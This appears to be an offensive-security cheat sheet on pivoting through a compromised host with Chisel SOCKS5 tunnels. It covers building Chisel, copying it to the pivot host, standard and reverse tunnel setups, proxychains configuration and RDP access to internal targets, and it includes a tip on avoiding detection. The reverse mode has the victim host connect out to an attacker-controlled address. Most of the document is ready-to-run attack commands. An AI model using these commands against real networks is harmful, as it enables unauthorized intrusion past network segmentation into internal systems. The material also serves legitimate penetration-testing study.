
# SOCKS5 Tunneling with Chisel

**Chisel** is a TCP/UDP-based tunneling tool written in Go that transports data via HTTP, secured using SSH. It is designed to create client-server tunnel connections in firewall-restricted environments.

## Preparation and Setup

### 1. Build the Chisel Binary

Chisel must be compiled for the specific architecture of the attack host and the pivot host.

|Action|Command|
|:--|:--|
|**Clone Repository**|`git clone https://github.com/jpillora/chisel.git`|
|**Build Binary**|`cd chisel && go build`|

**Edge Cases & Failure Conditions:**

- **glibc Discrepancies:** Errors may occur if the `glibc` library versions differ between the build workstation and the target. If this happens, use an older prebuilt version from the GitHub Releases section.
- **Detection & Performance:** Large file transfers can trigger detection or impact performance. Consider shrinking the binary size before transfer.

### 2. Transfer to Pivot Host

Once built, transfer the binary to the compromised host.

```
scp chisel <USERNAME>@<PIVOT_IP>:~/
```

---

## Technique 1: Standard SOCKS5 Tunneling

**Use Case:** Use this technique when the attack host can establish **direct inbound connections** to the pivot host.

### Operational Workflow

1. **Start the Chisel Server on the Pivot Host:** This creates a listener that will forward traffic to all networks accessible by the pivot host.
    
    ```
    ./chisel server -v -p <PORT> --socks5
    ```
    
2. **Connect the Chisel Client from the Attack Host:** This establishes the tunnel and opens a local SOCKS5 proxy port (typically `1080`) on the attack machine.
    
    ```
    ./chisel client -v <PIVOT_IP>:<PORT> socks
    ```
    
3. **Configure Proxychains:** Modify `/etc/proxychains.conf` to route traffic through the newly created tunnel.
    
    ```
    # Add to the end of /etc/proxychains.conf
    socks5 127.0.0.1 <SOCKS_PORT>
    ```
    
4. **Execute Attacks:** Use `proxychains` to reach internal targets via the pivot.
    
    ```
    proxychains xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD>
    ```
    

---

## Technique 2: Chisel Reverse Pivot

**Use Case:** Use when **firewall rules restrict inbound connections** to the compromised pivot host. In this scenario, the pivot host initiates the connection back to the attack machine.

### Operational Workflow

1. **Start the Chisel Server on the Attack Host:** Enable the `--reverse` option to allow the server to accept reversed remote connections.
    
    ```
    sudo ./chisel server --reverse -v -p <PORT> --socks5
    ```
    
2. **Connect the Chisel Client from the Pivot Host:** The client specifies `R:socks` to indicate that the server should listen on its default SOCKS port (1080) and proxy traffic back through the client to the internal network.
    
    ```
    ./chisel client -v <ATTACK_IP>:<PORT> R:socks
    ```
    
3. **Configure Proxychains:** Ensure `/etc/proxychains.conf` points to the local SOCKS port on the attack host.
    
    ```
    socks5 127.0.0.1 1080
    ```
    
4. **Execute Attacks:** Use `proxychains` to tunnel tools through the established reverse connection.
    
    ```
    proxychains xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD>
    ```
    

---

## Command Reference Summary

|Role|Mode|Command|
|:--|:--|:--|
|**Pivot Host**|Standard (Server)|`./chisel server -v -p <PORT> --socks5`|
|**Attack Host**|Standard (Client)|`./chisel client -v <PIVOT_IP>:<PORT> socks`|
|**Attack Host**|Reverse (Server)|`sudo ./chisel server --reverse -v -p <PORT> --socks5`|
|**Pivot Host**|Reverse (Client)|`./chisel client -v <ATTACK_IP>:<PORT> R:socks`|

**Attack Implications:** Successfully establishing a Chisel tunnel (standard or reverse) allows the attack machine to bypass network segmentation and interact with internal assets, such as Domain Controllers, that are not directly reachable from the external network.